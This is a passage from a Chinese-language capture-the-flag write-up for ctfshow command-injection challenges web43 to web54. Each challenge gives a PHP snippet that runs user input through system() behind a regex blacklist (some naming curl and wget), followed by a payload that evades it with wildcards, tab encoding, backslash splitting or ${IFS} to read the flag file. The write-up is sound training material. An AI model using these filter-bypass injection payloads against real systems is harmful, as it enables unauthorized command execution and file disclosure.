+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在前面基础上过滤了cat和;号，我们使用其他命令分隔符即可</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;tac flag.php||</span><br></pre></td></tr></table></figure>
+<h3 id="web44"><a class="header-anchor" href="#web44">¶</a>web44</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">f(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/;|cat|flag/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>把flag过滤了，相信如果你从前面做到现在，心中应该也知道怎么绕过了哈哈，使用通配符进行绕过</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;tac fla*||</span><br></pre></td></tr></table></figure>
+<h3 id="web45"><a class="header-anchor" href="#web45">¶</a>web45</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| /i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这次把空格也过滤了，ok，使用%09进行绕过，%09是tab的url编码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;tac%09fla*||</span><br></pre></td></tr></table></figure>
+<h3 id="web46"><a class="header-anchor" href="#web46">¶</a>web46</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这次把数字都过滤了，还把通配符<code>*</code>进行了过滤，我们可以改用<code>?</code>进行匹配，同时空格的话还是可以继续使用%09，它不属于过滤的数字范畴</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;tac%09fla?.php||</span><br></pre></td></tr></table></figure>
+<h3 id="web47"><a class="header-anchor" href="#web47">¶</a>web47</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这次多过滤了几个读取文件的命令，但tac没有被过滤我们继续使用之前的payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;tac%09fla?.php||</span><br></pre></td></tr></table></figure>
+<p>这里补充一下一些其他命令读取的操作</p>
+<blockquote>
+<p>more:一页一页的显示档案内容<br>
+less:与 more 类似<br>
+head:查看头几行<br>
+tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>
+tail:查看尾几行<br>
+nl：显示的时候，顺便输出行号<br>
+od:以二进制的方式读取档案内容<br>
+vi:一种编辑器，这个也可以查看<br>
+vim:一种编辑器，这个也可以查看<br>
+sort:可以查看<br>
+uniq:可以查看<br>
+file -f:报错出具体内容<br>
+grep<br>
+1、在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令：<br>
+grep test *file<br>
+strings</p>
+</blockquote>
+<h3 id="web48"><a class="header-anchor" href="#web48">¶</a>web48</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这次还是多过滤了一些读取的命令，tac没有被过滤，继续使用前面的payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;tac%09fla?.php||</span><br></pre></td></tr></table></figure>
+<h3 id="web49"><a class="header-anchor" href="#web49">¶</a>web49</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>还是没有过滤tac，继续使用前面的payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;tac%09fla?.php||</span><br></pre></td></tr></table></figure>
+<h3 id="web50"><a class="header-anchor" href="#web50">¶</a>web50</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这次把<code>%</code>进行了过滤，我们使用&lt;&gt;号进行绕过，这里通配符进行修改一下，&lt;&gt;和？一起没有显示出来，改用<code>\</code>进行绕过，paylaod如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;tac&lt;&gt;fla\g.php||</span><br></pre></td></tr></table></figure>
+<h3 id="web51"><a class="header-anchor" href="#web51">¶</a>web51</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这次对tac进行了过滤，我们可以用<code>\</code>分割进行绕过，payload如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;ta\c&lt;&gt;fla\g.php||</span><br></pre></td></tr></table></figure>
+<h3 id="web52"><a class="header-anchor" href="#web52">¶</a>web52</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这次过滤了尖括号，但放空了<code>$</code>符给我们，所以payload如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;ta\c$&#123;IFS&#125;fla\g.php||</span><br></pre></td></tr></table></figure>
+<p>但emmm，好像flag改地方了<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web52/NREZX%5B2B1Q8ODJ%6060%28O_OSO.png" alt=""><br>
+用ls找一下，发现在根目录<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web52/%5DGLTIXCV%7BG9W9%5D8%28C90%60L4E.png" alt=""><br>
+所以真正payload如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;ta\c$&#123;IFS&#125;..&#x2F;..&#x2F;..&#x2F;fla?||</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web52/%60PF%7B%24%24EPXTDI%255AV%40H%5BKA6F.png" alt=""></p>
+<h3 id="web53"><a class="header-anchor" href="#web53">¶</a>web53</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">echo</span>($c);</span><br><span class="line">        $d = system($c);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.$d;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>这次好像只把后面的吞回显给去掉了，那我们去掉后面的<code>||</code>即可，payload如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;ta\c$&#123;IFS&#125;fla?.php</span><br></pre></td></tr></table></figure>
+<h3 id="web54"><a class="header-anchor" href="#web54">¶</a>web54</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这次过滤了好多字母，也不能会用<code>\</code>的形式进行分割，但还有另一个读取的命令grep可以使用</p>
+<blockquote>
+<p>grep flag flag.php  查找flag.php文件中含有flag的那一行，并且打印出来</p>
+</blockquote>
+<p>所以我们可以构造payload如下，在flag.php中查找带有show字符串的一行(因为flag的格式为ctfshow{})</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;grep$&#123;IFS&#125;show$&#123;IFS&#125;fl?g.php</span><br></pre></td></tr></table></figure>
 ]]></content>
       <tags>
         <tag>CTF</tag>
